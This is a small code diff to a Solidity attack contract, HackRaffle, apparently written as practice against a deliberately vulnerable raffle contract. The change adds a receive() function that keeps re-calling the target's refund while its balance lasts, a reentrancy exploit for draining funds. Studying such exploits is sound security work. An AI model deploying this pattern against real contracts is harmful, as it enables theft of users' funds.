@@ -34,7 +34,10 @@ contract HackRaffle {
         // require(success, "Not good enough");
     }
 
-    fallback() external /* payable */ {
-        puppyRaffle.refund(index);
+    receive() external payable {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(index);
+        }
+        // puppyRaffle.refund(index);
     }
 }
